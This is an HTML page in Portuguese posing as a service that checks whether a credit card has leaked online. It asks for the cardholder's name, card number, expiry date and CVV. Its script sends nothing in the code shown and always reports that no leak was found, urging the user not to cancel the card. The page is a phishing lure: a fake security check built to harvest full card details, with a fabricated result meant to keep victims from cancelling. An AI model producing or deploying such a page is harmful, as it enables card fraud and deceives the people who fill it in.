<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Cartão</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .header {
            font-size: 24px; /* Aumentei o tamanho da fonte */
            font-weight: bold;
            color: #d8000c; /* Deixei chamativo com a cor vermelha */
            margin-bottom: 30px; /* Coloquei um pouco mais de espaçamento em relação ao conteúdo */
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        h1 {
            text-align: center;
            color: #006c45;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #006c45;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #004c33;
        }
        .alert {
            display: none;
            background-color: #ccffcc; /* Fundo mais suave */
            color: #006c45; /* Cor verde */
            padding: 10px;
            border-radius: 4px;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="header">
        Verifique aqui se o seu cartão já foi vazado na internet
    </div>

    <div class="container">
        <h1>Verificação de Cartão</h1>
        <form id="cardForm">
            <input type="text" id="name" placeholder="Nome do Titular" required>
            <input type="text" id="cardNumber" placeholder="Número do Cartão" required>
            <input type="text" id="expiryDate" placeholder="Data de Validade (MM/AA)" required>
            <input type="text" id="cvv" placeholder="CVV" required>
            <button type="submit">Verificar Cartão</button>
        </form>
        <div id="alert" class="alert">
            <p>Seu cartão foi verificado e não foram localizados dados em nenhum vazamento, por favor não o cancele!</p>
        </div>
    </div>

    <script>
        document.getElementById('cardForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Impede o envio do formulário
            document.getElementById('alert').style.display = 'block'; // Exibe o alerta
        });
    </script>

</body>
</html>
